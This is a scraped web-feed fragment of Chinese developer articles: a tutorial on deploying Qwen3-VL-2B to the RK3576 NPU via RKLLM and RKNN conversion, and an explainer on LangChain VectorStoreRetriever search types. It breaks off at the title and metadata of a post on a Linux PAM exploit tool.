.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>本文记录一次完整、可复现的工程实践：<br/>
在 <strong>RK3576</strong> 平台上，将多模态大模型 <strong>Qwen3-VL-2B</strong> 拆分并部署到 NPU 上运行。</p>
<p>目标不是介绍工具功能，而是让读者：</p>
<blockquote>
<p><strong>按照本文步骤执行代码，最终在板端成功跑起多模态推理 Demo。</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-0">一、整体部署流程总览（先看全局）</h2>
<p>在 RK 平台上，多模态模型<strong>无法以单一模型部署</strong>，必须拆分为两个子模型：</p>
<ul>
<li>Vision Encoder → <code>.rknn</code></li>
<li>LLM Decoder → <code>.rkllm</code></li>
</ul>
<p>整体流程如下：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/494cb71355e94d34a0d852ce79687ad6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmFzdE1vTU8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769062930&amp;x-signature=foIZxc7HqboN4y0iZSr0p%2FTgpTw%3D" alt="Image" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a3c454a970e4f48a11680db74c46da0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmFzdE1vTU8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769062930&amp;x-signature=T3zWC1KixG4eMd3qSfuXtYWMfO4%3D" alt="Image" loading="lazy"/></p>
<p><strong>本文最终产物：</strong></p>
<pre><code class="hljs">qwen3-vl_vision_rk3576.rknn
qwen3-vl-2b-instruct_w8a8_rk3576.rkllm
</code></pre>
<hr/>
<h2 data-id="heading-1">二、环境准备（必须一致）</h2>
<h3 data-id="heading-2">1️⃣ 主机环境（模型转换）</h3>





















<table><thead><tr><th>项目</th><th>版本</th></tr></thead><tbody><tr><td>OS</td><td>Ubuntu 22.04 x86_64</td></tr><tr><td>Python</td><td>3.10</td></tr><tr><td>工具</td><td>Miniforge / Conda</td></tr></tbody></table>
<h3 data-id="heading-3">2️⃣ 开发板环境</h3>





















<table><thead><tr><th>项目</th><th>说明</th></tr></thead><tbody><tr><td>芯片</td><td>RK3576</td></tr><tr><td>系统</td><td>Linux</td></tr><tr><td>推理</td><td>NPU</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-4">三、模型准备</h2>
<p>拉取 Qwen3-VL-2B 模型（HuggingFace / ModelScope 均可）：</p>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> https://huggingface.co/Qwen/Qwen3-VL-2B-Instruct
</code></pre>
<p>假设模型路径为：</p>
<pre><code class="hljs language-bash" lang="bash">/workspace/Qwen3-VL-2B-Instruct
</code></pre>
<hr/>
<h2 data-id="heading-5">四、LLM 部分：RKLLM 转换与量化（核心）</h2>
<h3 data-id="heading-6">4.1 加载模型</h3>
<pre><code class="hljs language-ini" lang="ini">from rkllm.api import RKLLM

<span class="hljs-attr">llm</span> = RKLLM()

<span class="hljs-attr">ret</span> = llm.load_huggingface(
    <span class="hljs-attr">model</span>=<span class="hljs-string">"/workspace/Qwen3-VL-2B-Instruct"</span>,
    <span class="hljs-attr">device</span>=<span class="hljs-string">"cpu"</span>,
    <span class="hljs-attr">dtype</span>=<span class="hljs-string">"float16"</span>,
)

if ret != 0:
    raise RuntimeError("load_huggingface failed")
</code></pre>
<p><strong>说明：</strong></p>
<ul>
<li>使用 CPU 转换，避免显存不足</li>
<li>FP16 对 w8a8 量化足够</li>
</ul>
<hr/>
<h3 data-id="heading-7">4.2 构建量化数据集（关键步骤）</h3>
<p>多模态模型不能直接量化原始图像输入，需要先构造 <code>inputs_embeds</code>。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">inputs_embeds</span> = model.get_input_embeddings()(inputs[<span class="hljs-string">"input_ids"</span>])

<span class="hljs-attr">image_mask</span> = inputs[<span class="hljs-string">"input_ids"</span>] == model.config.image_token_id
<span class="hljs-attr">image_embeds</span> = model.visual(
    inputs<span class="hljs-section">["pixel_values"]</span>,
    <span class="hljs-attr">grid_thw</span>=inputs[<span class="hljs-string">"image_grid_thw"</span>]
)

inputs_embeds<span class="hljs-section">[image_mask]</span> = image_embeds
</code></pre>
<p>将 <code>inputs_embeds</code> 保存为 numpy，用于量化校准：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
np.<span class="hljs-title function_">save</span>(<span class="hljs-string">"inputs_embeds.npy"</span>, inputs_embeds.<span class="hljs-title function_">cpu</span>().<span class="hljs-title function_">numpy</span>())
</code></pre>
<p>最终生成 <code>inputs.json</code>，作为 RKLLM 的校准数据集。</p>
<hr/>
<h3 data-id="heading-8">4.3 构建并导出 RKLLM 模型</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">ret</span> = llm.build(
    <span class="hljs-attr">do_quantization</span>=<span class="hljs-literal">True</span>,
    <span class="hljs-attr">quantized_dtype</span>=<span class="hljs-string">"w8a8"</span>,
    <span class="hljs-attr">quantized_algorithm</span>=<span class="hljs-string">"normal"</span>,
    <span class="hljs-attr">target_platform</span>=<span class="hljs-string">"RK3576"</span>,
    <span class="hljs-attr">num_npu_core</span>=<span class="hljs-number">2</span>,
    <span class="hljs-attr">dataset</span>=<span class="hljs-string">"data/inputs.json"</span>
)

if ret != 0:
    raise RuntimeError("build failed")

llm.export_rkllm(
    "qwen3-vl-2b-instruct_w8a8_rk3576.rkllm"
)
</code></pre>
<hr/>
<h2 data-id="heading-9">五、Vision 部分：ONNX → RKNN</h2>
<h3 data-id="heading-10">5.1 导出 Vision ONNX</h3>
<pre><code class="hljs language-css" lang="css">python export_vision<span class="hljs-selector-class">.py</span> \
  <span class="hljs-attr">--path</span> /workspace/Qwen3-VL-<span class="hljs-number">2</span>B-Instruct \
  <span class="hljs-attr">--model_name</span> qwen3-vl \
  <span class="hljs-attr">--height</span> <span class="hljs-number">448</span> \
  <span class="hljs-attr">--width</span> <span class="hljs-number">448</span>
</code></pre>
<p>输出：</p>
<pre><code class="hljs">qwen3-vl_vision.onnx
</code></pre>
<hr/>
<h3 data-id="heading-11">5.2 ONNX 转 RKNN</h3>
<pre><code class="hljs language-css" lang="css">python export_vision_rknn<span class="hljs-selector-class">.py</span> \
  <span class="hljs-attr">--path</span> qwen3-vl_vision<span class="hljs-selector-class">.onnx</span> \
  <span class="hljs-attr">--target-platform</span> rk3576 \
  <span class="hljs-attr">--height</span> <span class="hljs-number">448</span> \
  <span class="hljs-attr">--width</span> <span class="hljs-number">448</span>
</code></pre>
<p>输出：</p>
<pre><code class="hljs">qwen3-vl_vision_rk3576.rknn
</code></pre>
<hr/>
<h2 data-id="heading-12">六、板端部署与运行</h2>
<h3 data-id="heading-13">6.1 拷贝文件到开发板</h3>
<pre><code class="hljs language-vbnet" lang="vbnet">qwen3-vl_vision_rk3576.rknn
qwen3-vl-<span class="hljs-number">2</span>b-instruct_w8a8_rk3576.rkllm
demo
<span class="hljs-keyword">lib</span>/
</code></pre>
<hr/>
<h3 data-id="heading-14">6.2 设置运行环境</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">export</span> LD_LIBRARY_PATH=./lib:<span class="hljs-variable">$LD_LIBRARY_PATH</span>
</code></pre>
<hr/>
<h3 data-id="heading-15">6.3 运行 Demo</h3>
<pre><code class="hljs language-bash" lang="bash">./demo demo.jpg \
  qwen3-vl_vision_rk3576.rknn \
  qwen3-vl-2b-instruct_w8a8_rk3576.rkllm \
  256 2048 2 \
  <span class="hljs-string">"&lt;|vision_start|&gt;"</span> <span class="hljs-string">"&lt;|vision_end|&gt;"</span> <span class="hljs-string">"&lt;|image_pad|&gt;"</span>
</code></pre>
<p><strong>参数说明：</strong></p>
<ul>
<li><code>vision_start / vision_end</code>：标识视觉 embedding 边界</li>
<li><code>image_pad</code>：多图或补齐占位符</li>
</ul>
<hr/>
<h2 data-id="heading-16">七、结果验证</h2>
<p>运行成功后，终端会输出模型对图片内容的描述或回答。</p>
<p>至此，一个 <strong>完整的端侧多模态推理流程部署完成</strong>。</p>
<hr/>
<h2 data-id="heading-17">八、实践总结</h2>
<ol>
<li>RK 平台多模态模型必须拆分</li>
<li>RKLLM 的核心是量化与运行时管理</li>
<li>量化数据准备是成功关键</li>
<li>w8a8 是当前最稳妥的工程选择</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[VectorStoreRetriever 三种搜索类型]]></title>    <link>https://juejin.cn/post/7595289498445791258</link>    <guid>https://juejin.cn/post/7595289498445791258</guid>    <pubDate>2026-01-15T07:19:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595289498445791258" data-draft-id="7595351120667885594" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="VectorStoreRetriever 三种搜索类型"/> <meta itemprop="keywords" content="Python,LangChain"/> <meta itemprop="datePublished" content="2026-01-15T07:19:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="sky1720"/> <meta itemprop="url" content="https://juejin.cn/user/791239358694760"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            VectorStoreRetriever 三种搜索类型
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/791239358694760/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    sky1720
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T07:19:20.000Z" title="Thu Jan 15 2026 07:19:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">VectorStoreRetriever 三种搜索类型深度解析：差异、场景与选型</h2>
<p>在 LangChain 等大模型应用开发中，<code>VectorStoreRetriever</code> 是连接向量数据库与大模型的核心组件，负责从知识库中精准召回与查询相关的文档。它支持三种核心搜索类型：<code>similarity</code>（默认）、<code>similarity_score_threshold</code>、<code>mmr</code>。</p>
<p>很多开发者在实际开发中会困惑：这三种搜索类型到底有什么区别？不同场景该选哪种？本文将从原理、参数、适用场景、实际效果四个维度，帮你彻底理清它们的差异，给出明确的选型建议。</p>
<h3 data-id="heading-1">一、先明确基础信息：三种搜索类型概览</h3>
<p>先通过一张表格快速掌握三种搜索类型的核心定义和默认参数：</p>

























<table><thead><tr><th>搜索类型</th><th>说明</th><th>默认参数</th></tr></thead><tbody><tr><td>similarity</td><td>相似度搜索（默认）</td><td>{"k": 4} - 返回前k个最相似的文档</td></tr><tr><td>similarity_score_threshold</td><td>带分数阈值的相似度搜索</td><td>{"k": 4, "score_threshold": 0.8} - 返回相似度大于阈值的文档</td></tr><tr><td>mmr</td><td>最大边际相关性搜索</td><td>{"k": 4, "fetch_k": 20, "lambda_mult": 0.5} - 平衡相关性和多样性</td></tr></tbody></table>
<h3 data-id="heading-2">二、深度拆解：三种搜索类型的核心差异</h3>
<h4 data-id="heading-3">1. similarity：纯相关性优先的基础搜索</h4>
<h5 data-id="heading-4">核心原理</h5>
<p>最基础的向量搜索逻辑：计算查询向量与知识库中所有文档向量的相似度（常用余弦相似度），按相似度从高到低排序，直接取前 <code>k</code> 个结果。</p>
<p>核心特点：只关注“相关性”，不考虑结果是否重复，也不设置任何筛选门槛。</p>
<h5 data-id="heading-5">参数解读</h5>
<p>仅需关注 <code>k</code>：代表最终返回的文档数量，默认值为4。无论文档相似度多低，只要排名在前k位，就会被返回（若知识库中文档不足k个，则返回全部）。</p>
<h5 data-id="heading-6">适用场景</h5>
<ul>
<li>简单问答场景：比如小型知识库的精准匹配，希望快速获取最相关的结果；</li>
<li>知识库特性：文档数量少、内容同质化低，几乎没有重复内容；</li>
<li>需求明确：对结果数量有硬性要求，不需要过滤低相关性内容。</li>
</ul>
<h5 data-id="heading-7">实际效果示例</h5>
<p>查询：「如何学习Python」</p>
<p>返回结果：相似度排名前4的文档，可能是「Python基础语法入门」「Python基础语法详解」「Python入门实战案例」「Python学习路径规划」—— 其中前两篇内容高度重复，但因相关性最高仍会被同时返回。</p>
<h4 data-id="heading-8">2. similarity_score_threshold：带门槛的精准搜索</h4>
<h5 data-id="heading-9">核心原理</h5>
<p>在纯相似度搜索的基础上，增加了“相似度阈值”筛选。流程是：先计算所有文档的相似度 → 过滤掉相似度低于 <code>score_threshold</code> 的文档 → 从剩余符合条件的文档中取前 <code>k</code> 个（若符合条件的文档不足k个，则返回全部符合条件的）。</p>
<p>核心特点：兼顾相关性和精准度，通过阈值过滤低质量、低相关性的“噪音文档”。</p>
<h5 data-id="heading-10">参数解读</h5>
<ul>
<li><code>k</code>：最终返回的最大文档数量，默认4；</li>
<li><code>score_threshold</code>：相似度阈值（范围0-1），值越高要求越严格，默认0.8。</li>
</ul>
<h5 data-id="heading-11">适用场景</h5>
<ul>
<li>高精准度要求场景：比如专业领域问答（医疗、法律、金融），不允许返回无关或擦边内容；</li>
<li>复杂知识库：知识库中存在大量无关文档，需要过滤噪音；</li>
<li>严格质量控制：比如客服机器人，必须保证回答的依据是高度相关的文档。</li>
</ul>
<h5 data-id="heading-12">实际效果示例</h5>
<p>查询：「如何学习Python」，设置 <code>score_threshold=0.8</code></p>
<p>返回结果：仅保留相似度≥0.8的文档。若符合条件的文档只有2篇（「Python基础语法入门」「Python学习路径规划」），则最终返回2篇，而非强制返回4篇。</p>
<h4 data-id="heading-13">3. mmr：平衡相关与多样的全面搜索</h4>
<h5 data-id="heading-14">核心原理</h5>
<p>MMR（Maximum Marginal Relevance，最大边际相关性）是一种进阶搜索算法，核心目标是“兼顾相关性和多样性”，避免返回内容重复的结果。具体流程：</p>
<ol>
<li>先从知识库中筛选出 <code>fetch_k</code> 个最相似的文档（作为候选集，默认20）；</li>
<li>从候选集中迭代选择文档：优先选与查询相关的，但同时尽量避免选与已选文档高度相似的；</li>
<li>通过 <code>lambda_mult</code> 调节权重：值越接近1，越偏向相关性；越接近0，越偏向多样性（默认0.5，均衡状态）。</li>
</ol>
<h5 data-id="heading-15">参数解读</h5>
<ul>
<li>
<p><code>k</code>：最终返回的文档数量，默认4；</p>
</li>
<li>
<p><code>fetch_k</code>：候选集大小（需≥k），候选集越大，可选的多样性文档越多；</p>
</li>
<li>
<p><code>lambda_mult</code>：平衡系数（0-1），默认0.5：</p>
<ul>
<li>lambda_mult=1：等价于纯similarity搜索（只看相关性）；</li>
<li>lambda_mult=0：完全追求多样性（可能忽略相关性，不推荐）。</li>
</ul>
</li>
</ul>
<h5 data-id="heading-16">适用场景</h5>
<ul>
<li>开放式问答场景：需要覆盖多角度答案，比如「Python学习方法有哪些」，希望同时获取基础语法、项目实战、书籍推荐、在线课程等不同维度的内容；</li>
<li>高重复度知识库：知识库中存在大量相似文档（如同一问题的不同版本回答），需要避免重复召回；</li>
<li>全面信息需求：比如用户需要了解某个主题的全貌，而非单一精准答案。</li>
</ul>
<h5 data-id="heading-17">实际效果示例</h5>
<p>查询：「如何学习Python」，设置 <code>lambda_mult=0.5</code></p>
<p>返回结果：不会出现多篇重复的基础语法文档，而是均衡返回「Python基础语法入门」「Python项目实战指南」「Python经典学习书籍推荐」「Python在线课程汇总」—— 兼顾相关性和多样性。</p>
<h3 data-id="heading-18">三、关键差异对比表（一目了然）</h3>









































<table><thead><tr><th>对比维度</th><th>similarity</th><th>similarity_score_threshold</th><th>mmr</th></tr></thead><tbody><tr><td>核心目标</td><td>仅追求最高相关性</td><td>高相关性 + 过滤低质量结果</td><td>相关性与多样性平衡</td></tr><tr><td>核心参数</td><td>k（返回数量）</td><td>k、score_threshold（阈值）</td><td>k、fetch_k（候选集）、lambda_mult（平衡系数）</td></tr><tr><td>结果特点</td><td>相关性最高，但可能重复</td><td>精准度高，无低相关结果</td><td>兼顾相关与多样，避免重复</td></tr><tr><td>适用场景</td><td>简单精准匹配、小型知识库</td><td>专业领域、高精准度需求</td><td>开放式问答、全面信息需求</td></tr><tr><td>结果数量</td><td>固定返回k个（不足则补全）</td><td>最多返回k个（可能更少）</td><td>固定返回k个</td></tr></tbody></table>
<h3 data-id="heading-19">四、选型建议：按场景快速决策</h3>
<p>掌握了差异后，实际开发中无需纠结，按以下原则快速选型：</p>
<ol>
<li>若需求简单、追求快速精准匹配，且知识库内容干净（无太多噪音）：选默认的 <code>similarity</code>；</li>
<li>若对结果精准度要求极高，不允许出现无关内容（如专业领域、客服机器人）：选 <code>similarity_score_threshold</code>，建议将 <code>score_threshold</code> 设为0.7-0.9（根据知识库实际情况调整）；</li>
<li>若需要覆盖多角度答案、避免重复内容（如开放式问答、主题全貌查询）：选 <code>mmr</code>，默认 <code>lambda_mult=0.5</code> 即可满足大部分场景，若需更侧重相关性可调至0.7-0.8。</li>
</ol>
<h3 data-id="heading-20">五、总结</h3>
<p>VectorStoreRetriever 的三种搜索类型，本质是为了适配不同的“召回需求”：</p>
<ul>
<li><code>similarity</code> 是基础款，主打“快准”；</li>
<li><code>similarity_score_threshold</code> 是精准款，主打“无噪音”；</li>
<li><code>mmr</code> 是进阶款，主打“全面性”。</li>
</ul>
<p>实际开发中，建议根据知识库的规模、内容特性以及用户的查询需求，灵活选择合适的搜索类型。如果不确定，也可以做小范围测试：用同一批查询对比三种类型的召回结果，再根据实际效果微调参数～</p>
<p>📌 本文配套代码示例（快速上手三种搜索类型）：</p>
<pre><code class="hljs language-ini" lang="ini">from langchain.vectorstores import Chroma
from langchain.embeddings import OpenAIEmbeddings

<span class="hljs-comment"># 初始化向量存储（示例）</span>
<span class="hljs-attr">embeddings</span> = OpenAIEmbeddings()
<span class="hljs-attr">vector_store</span> = Chroma(embedding_function=embeddings)

<span class="hljs-comment"># 1. similarity 搜索</span>
<span class="hljs-attr">retriever_similarity</span> = vector_store.as_retriever(
    <span class="hljs-attr">search_type</span>=<span class="hljs-string">"similarity"</span>,
    <span class="hljs-attr">search_kwargs</span>={<span class="hljs-string">"k"</span>: <span class="hljs-number">4</span>}
)

<span class="hljs-comment"># 2. similarity_score_threshold 搜索</span>
<span class="hljs-attr">retriever_threshold</span> = vector_store.as_retriever(
    <span class="hljs-attr">search_type</span>=<span class="hljs-string">"similarity_score_threshold"</span>,
    <span class="hljs-attr">search_kwargs</span>={<span class="hljs-string">"k"</span>: <span class="hljs-number">4</span>, <span class="hljs-string">"score_threshold"</span>: <span class="hljs-number">0.8</span>}
)

<span class="hljs-comment"># 3. mmr 搜索</span>
<span class="hljs-attr">retriever_mmr</span> = vector_store.as_retriever(
    <span class="hljs-attr">search_type</span>=<span class="hljs-string">"mmr"</span>,
    <span class="hljs-attr">search_kwargs</span>={<span class="hljs-string">"k"</span>: <span class="hljs-number">4</span>, <span class="hljs-string">"fetch_k"</span>: <span class="hljs-number">20</span>, <span class="hljs-string">"lambda_mult"</span>: <span class="hljs-number">0.5</span>}
)

<span class="hljs-comment"># 执行查询</span>
<span class="hljs-attr">query</span> = <span class="hljs-string">"如何学习Python"</span>
print(retriever_similarity.get_relevant_documents(query))
print(retriever_threshold.get_relevant_documents(query))
print(retriever_mmr.get_relevant_documents(query))
}
</code></pre>
<p>如果觉得本文对你有帮助，欢迎点赞、收藏～ 有任何疑问或补充，欢迎在评论区交流！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Linux PAM环境变量注入漏洞利用工具解析]]></title>    <link>https://juejin.cn/post/7595056696518197267</link>    <guid>https://juejin.cn/post/7595056696518197267</guid>    <pubDate>2026-01-15T07:29:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595056696518197267" data-draft-id="7595167566143815699" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Linux PAM环境变量注入漏洞利用工具解析"/> <meta itemprop="keywords" content="人工智能,AIGC"/> <meta itemprop="datePublished" content="2026-01-15T07:29:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="qife122"/> <meta itemprop="url" content="https://juejin.cn/user/1743174852185579"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Linux PAM环境变量注入漏洞利用工具解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1743174852185579/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    qife122
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T07:29:23.000Z" title="Thu Jan 15 2026 07:29:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
